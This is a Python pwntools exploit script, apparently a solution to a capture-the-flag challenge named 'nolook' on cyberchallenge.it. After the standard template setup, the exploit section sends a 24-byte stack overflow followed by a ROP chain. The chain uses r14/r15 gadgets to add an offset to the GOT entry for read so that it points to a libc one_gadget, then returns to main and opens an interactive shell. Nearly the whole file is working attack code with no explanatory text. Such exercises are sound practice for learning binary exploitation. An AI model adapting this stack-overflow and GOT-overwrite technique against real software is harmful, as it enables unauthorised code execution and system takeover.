#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./nolook --host nolook.challs.cyberchallenge.it --port 9135
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './nolook_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'nolook.challs.cyberchallenge.it'
port = int(args.PORT or 9135)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x400616
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

offset = 24
add_r14_r15 = 0x00000000004005af
pop_r14_r15 = 0x0000000000400680
one_gadget_addr = 0x4f322

libc_exe = ELF("./libc.so.6")
diff = libc_exe.symbols['read'] - one_gadget_addr

payload = b'a' * offset + p64(pop_r14_r15) + p64(exe.got['read']-0x90) \
    + p64(-diff, sign='signed') + p64(add_r14_r15) + p64(exe.symbols['main'])
io.sendline(payload)

io.interactive()
